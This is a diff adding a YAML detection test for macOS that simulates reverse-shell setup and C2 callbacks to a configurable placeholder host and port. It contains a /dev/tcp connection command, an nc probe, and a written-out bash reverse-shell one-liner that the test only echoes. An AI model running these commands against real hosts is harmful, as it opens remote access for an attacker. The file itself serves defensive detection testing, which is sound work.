@@ -1,0 +1,72 @@
+api_version: 2.0
+id: 005-reverse-shell-setup-detection
+name: Reverse Shell Setup Detection
+description: Detects reverse shell setup and C2 callback attempts
+type: command_and_control
+
+requirements:
+  platforms:
+    - os: darwin
+
+args:
+  - name: c2_host
+    type: string
+    description: C2 server IP or hostname
+    default: "192.168.1.100"
+  - name: c2_port
+    type: integer
+    description: C2 server listening port
+    default: 4444
+  - name: timeout
+    type: integer
+    description: Connection timeout in seconds
+    default: 5
+
+steps:
+  - name: check_port_connectivity
+    description: Test connectivity to C2 port
+    command: |
+      timeout {{ timeout }} bash -c "cat < /dev/null > /dev/tcp/{{ c2_host }}/{{ c2_port }}" && echo "Port {{ c2_port }} is open" || echo "Port {{ c2_port }} is closed"
+    type: command
+  
+  - name: netcat_connection_test
+    description: Test reverse shell with nc
+    command: |
+      if command -v nc &> /dev/null; then
+        timeout {{ timeout }} nc -zv {{ c2_host }} {{ c2_port }}
+      else
+        echo "nc not available"
+      fi
+    type: command
+  
+  - name: bash_reverse_shell_test
+    description: Test bash reverse shell capability
+    command: |
+      echo "Testing bash reverse shell capability..."
+      echo "Would execute: bash -i >& /dev/tcp/{{ c2_host }}/{{ c2_port }} 0>&1" >&2
+    type: command
+    cleanup: true
+
+checks:
+  - name: verify_c2_connectivity
+    description: Verify C2 connectivity established
+    condition: |
+      Connection should succeed or show port reachability
+    type: output_validation
+
+test_type: dry_run
+
+cleanup:
+  - name: close_connections
+    description: Ensure all test connections closed
+    command: |
+      pkill -f "nc.*{{ c2_host }}.*{{ c2_port }}" 2>/dev/null || true
+      pkill -f "bash.*{{ c2_host }}.*{{ c2_port }}" 2>/dev/null || true
+    type: command
+    optional: true
+
+metadata:
+  created: 2026-01-30
+  author: Claude Code
+  severity: high
+  category: remote_access
